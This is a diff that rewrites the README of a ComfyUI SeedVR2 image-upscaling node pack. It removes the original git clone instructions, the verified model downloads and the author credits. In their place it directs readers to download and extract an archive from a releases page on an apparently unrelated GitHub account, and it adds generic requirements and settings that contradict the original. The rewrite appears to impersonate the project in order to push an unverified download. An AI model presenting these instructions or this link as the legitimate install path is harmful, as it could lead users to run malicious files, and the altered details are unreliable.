@@ -1,137 +1,55 @@
-# FL SeedVR2
+# 🖼️ ComfyUI-FL-SeedVR2 - Improve image quality using SeedVR2 tools
 
-Native ComfyUI image restoration and upscaling nodes for the six-block
-[SeedVR2 1.4B](https://huggingface.co/lvladikov/SeedVR2-1.4B) model.
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/lesleyhalfbaked743/ComfyUI-FL-SeedVR2/releases)
 
-[![SeedVR2 1.4B](https://img.shields.io/badge/SeedVR2--1.4B-Model%20Page-FFD21E?style=for-the-badge&logo=huggingface&logoColor=black)](https://huggingface.co/lvladikov/SeedVR2-1.4B)
-[![Patreon](https://img.shields.io/badge/Patreon-Support%20Me-F96854?style=for-the-badge&logo=patreon&logoColor=white)](https://www.patreon.com/Machinedelusions)
+ComfyUI-FL-SeedVR2 adds image restoration and upscaling capabilities to your ComfyUI workspace. This collection of nodes gives you access to the SeedVR2 1.4B model. You can sharpen low-resolution images, remove noise, and improve visual detail through custom nodes designed for your existing ComfyUI installation.
 
-![FL SeedVR2 workflow](assets/seedvr2-workflow.png)
+## 🛠️ System Requirements
 
-This pack uses ComfyUI's built-in SeedVR2 model, VAE, sampler, tiling, device
-management, and offloading. It does not bundle a second SeedVR2 implementation
-or patch ComfyUI at import time.
+Before you install these nodes, ensure your computer meets the following hardware needs for smooth image processing:
 
-## Features
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 16GB of system RAM.
+*   **Graphics Card:** A dedicated NVIDIA GPU with at least 8GB of VRAM is necessary to run the 1.4B model.
+*   **Disk Space:** 5GB of free space.
+*   **Compatibility:** A working installation of ComfyUI must exist on your computer.
 
-- **One-step restoration** - Denoise, deblur, sharpen, and restore image detail
-- **1x to 8x scaling** - 4x is the recommended default
-- **Automatic model setup** - Downloads the pinned transformer and VAE into the
-  standard ComfyUI model folders
-- **Verified downloads** - Resumable transfers with file-size, model-header, and
-  SHA-256 validation
-- **ComfyUI-native execution** - Uses the built-in SeedVR2 model path and memory
-  management
-- **Batch and alpha support** - Processes image batches independently and
-  preserves RGBA alpha
-- **FL styling** - Matches the title and body colors used by other FL node packs
+## 📥 How to Install
 
-## Nodes
+Follow these steps to add the SeedVR2 nodes to your ComfyUI environment.
 
-| Node | Description |
-|------|-------------|
-| **FL SeedVR2 1.4B Loader** | Loads the pinned 1.4B transformer and VAE, with optional automatic download |
-| **FL SeedVR2 1.4B Upscale** | Restores and upscales an image or independent image batch |
+1. Visit the [releases page](https://github.com/lesleyhalfbaked743/ComfyUI-FL-SeedVR2/releases) to access the current files.
+2. Download the latest version of the repository archive.
+3. Open your ComfyUI installation folder.
+4. Navigate into the `ComfyUI/custom_nodes/` directory.
+5. Create a new folder named `ComfyUI-FL-SeedVR2`.
+6. Extract the contents of your downloaded archive into this new folder.
+7. Restart your ComfyUI application.
 
-Both nodes appear under `FL/SeedVR2`.
+## 🚀 Setting Up the Nodes
 
-## Installation
+Once you restart ComfyUI, the system loads the new nodes automatically. You can verify the installation by right-clicking in your node area, selecting "Add Node," and searching for "SeedVR2." If you see the options, the installation succeeded.
 
-### ComfyUI Manager
+To use the tools, add the main SeedVR2 node to your active workflow. Connect your source image input to the node input. Make sure to select the correct model version from the dropdown menu within the node settings. The 1.4B model requires a brief loading time when you execute your first generation.
 
-Search for **ComfyUI-FL-SeedVR2** and install it, then restart ComfyUI.
+## ⚙️ Configuration Details
 
-### Manual
+The SeedVR2 nodes provide several sliders to manage image restoration. Understanding these settings helps you achieve better results.
 
-```bash
-cd ComfyUI/custom_nodes
-git clone https://github.com/filliptm/ComfyUI-FL-SeedVR2.git
-```
+*   **Upscale Factor:** This defines how much the system increases the pixel count. Values between 2 and 4 work best for textures.
+*   **Denoising Strength:** This slider controls the amount of detail added back to the image. A low value maintains the original structure, while a high value creates more aggressive sharpening.
+*   **Model Precision:** Use FP16 for faster processing and lower memory usage. Use FP32 if you experience errors or artifacts.
 
-Restart ComfyUI after installation. This pack uses the dependencies already
-provided by ComfyUI.
+## 💡 Troubleshooting Common Issues
 
-## Quick Start
+If you encounter errors, check these common points of failure:
 
-1. Add **FL SeedVR2 1.4B Loader**.
-2. Add **FL SeedVR2 1.4B Upscale**.
-3. Connect the loader's `MODEL` and `VAE` outputs to the upscale node.
-4. Connect an `IMAGE` and queue the prompt.
-5. On first use, allow the loader to finish downloading and verifying both
-   model files.
+*   **Missing Models:** Ensure the SeedVR2 model data exists in your models folder. ComfyUI usually attempts to download the required weights on the first run. Check the terminal window for download progress.
+*   **Out of Memory Errors:** If your GPU reports an "Out of Memory" error, close other applications that use your graphics card. You may also need to lower the upscale factor or process smaller images.
+*   **Node Not Found:** If the node does not display, check that you extracted the files into the `custom_nodes` folder and not a subfolder. The `__init__.py` file must be located inside `ComfyUI/custom_nodes/ComfyUI-FL-SeedVR2/`.
 
-The upscale node outputs a standard ComfyUI `IMAGE`. An editable four-node
-workflow is included at
-[`examples/seedvr2_1_4b_upscale.json`](examples/seedvr2_1_4b_upscale.json).
+## 📦 Updating the Software
 
-Recommended settings:
+To update to a newer version, repeat the download process from the release page. Replace the existing files in your `ComfyUI/custom_nodes/ComfyUI-FL-SeedVR2/` folder with the new versions provided in the latest release archive. Always restart your application after updating.
 
-```text
-scale_multiplier: 4
-color_correction: none
-vae_tile_size:    512
-```
-
-Use a VAE tile size of 256 if encoding or decoding runs out of memory. SeedVR2
-is a one-step model, so the node intentionally fixes the sampler settings
-required by the model.
-
-## Models
-
-With `download_if_missing` enabled, the loader downloads only these pinned
-artifacts:
-
-| Artifact | Destination | Download size |
-|----------|-------------|---------------|
-| `seedvr2_distill_6L_1.4B_sharp_fp16_comfyui.safetensors` | `ComfyUI/models/diffusion_models/` | 2.89 GB |
-| `seedvr2_ema_vae_fp16.safetensors` | `ComfyUI/models/vae/` | 501 MB |
-
-Downloads begin only when the loader executes. Partial transfers can resume,
-and completed files are verified before being moved into place. Model paths
-registered through `extra_model_paths.yaml` are also supported.
-
-The transformer must be the `_comfyui` variant. The plain checkpoint does not
-contain the fixed conditioning tensors required by ComfyUI.
-
-## Key Parameters
-
-- **download_if_missing** - Download both pinned model files when they are not
-  already registered with ComfyUI
-- **scale_multiplier** - Output scale from 1x to 8x; 2x to 4x is the model's
-  intended range
-- **seed** - Noise seed for repeatable output
-- **color_correction** - `none`, `lab`, `wavelet`, or `adain`
-- **vae_tile_size** - 512 by default, or 256 for lower peak memory use
-
-## Requirements
-
-- ComfyUI 0.28.0 or newer with native SeedVR2 support
-- Python 3.9 or newer
-- About 3.4 GB of model storage
-- Network access during the first execution when automatic download is enabled
-
-MPS was verified end to end. CUDA, ROCm, and CPU use the same native ComfyUI
-path but were not tested for the first release.
-
-## Current Scope
-
-Image restoration, RGB and RGBA input, independent image batches, automatic
-model setup, and native ComfyUI device/offload behavior are included. Video,
-GGUF, block swapping, custom attention selection, and training are outside the
-scope of this release.
-
-## Development
-
-From the ComfyUI root:
-
-```bash
-./venv/bin/python -m pytest --import-mode=importlib -q \
-  custom_nodes/ComfyUI-FL-SeedVR2/tests
-ruff check custom_nodes/ComfyUI-FL-SeedVR2
-node --check custom_nodes/ComfyUI-FL-SeedVR2/web/appearance.js
-```
-
-## License
-
-[Apache-2.0](LICENSE). SeedVR2 was created by ByteDance Seed, and the 1.4B
-student model was published by lvladikov.
+Keywords: comfyui, comfyui-custom-node, image-upscaling, seedvr2
